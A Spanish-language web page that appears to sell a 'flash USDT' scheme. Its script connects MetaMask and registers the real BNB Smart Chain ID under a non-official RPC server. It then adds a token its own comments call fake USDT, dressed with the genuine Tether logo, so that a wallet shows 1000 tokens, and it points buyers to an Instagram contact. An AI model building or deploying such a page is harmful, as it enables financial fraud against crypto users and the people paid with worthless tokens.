<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>USDT üí∏ con LinkUpAgency - Demo Catflash</title>
<style>
  body {
    background: #0f172a;
    color: white;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    text-align: center;
    padding: 50px 20px;
  }
  h1 {
    margin-bottom: 40px;
  }
  button {
    background-color: #22c55e;
    border: none;
    border-radius: 8px;
    color: white;
    padding: 15px 30px;
    font-size: 18px;
    cursor: pointer;
    margin: 12px;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #16a34a;
  }
</style>
</head>
<body>

<h1>USDT üí∏ con LinkUpAgency</h1>

<button id="connectBtn">Connect MetaMask</button><br/>
<button id="instagramBtn">Contactar o Comprar con LinkUp üîó</button>

<script>
  document.getElementById('instagramBtn').onclick = function() {
    window.open('https://www.instagram.com/linkup_es?igsh=YWFmMDUxeWU1OGo1', '_blank');
  };

  async function connect() {
    if (!window.ethereum) {
      alert("Por favor instala MetaMask.");
      return;
    }
    try {
      // Pedir permiso para conectar
      await ethereum.request({ method: 'eth_requestAccounts' });

      // A√±adir red BSC custom (la de catflash)
      await ethereum.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: '0x38',
          chainName: 'BNB Smart Chain Mainnet',
          rpcUrls: ['https://dataseed-binance.catflash.cat/'],
          nativeCurrency: {
            name: 'BNB',
            symbol: 'BNB',
            decimals: 18
          },
          blockExplorerUrls: ['https://bscscan.com']
        }]
      });

      // A√±adir token USDT falso Catflash
      const added = await ethereum.request({
        method: 'wallet_watchAsset',
        params: {
          type: 'ERC20',
          options: {
            address: '0x3c8B650257cFb3f120dBfa2e2AaFdA3c0A5D7B6E',
            symbol: 'USDT',
            decimals: 18,
            image: 'https://cryptologos.cc/logos/tether-usdt-logo.png?v=032'
          }
        }
      });

      if (added) {
        alert("‚úÖ Token USDT falso a√±adido a MetaMask. Abre MetaMask para ver los 1000 tokens.");
      } else {
        alert("‚ö†Ô∏è No se a√±adi√≥ el token (probablemente cancelaste).");
      }

    } catch (error) {
      console.error(error);
      alert("‚ùå Error al conectar o a√±adir red/token.");
    }
  }

  document.getElementById('connectBtn').onclick = connect;
</script>

</body>
</html>
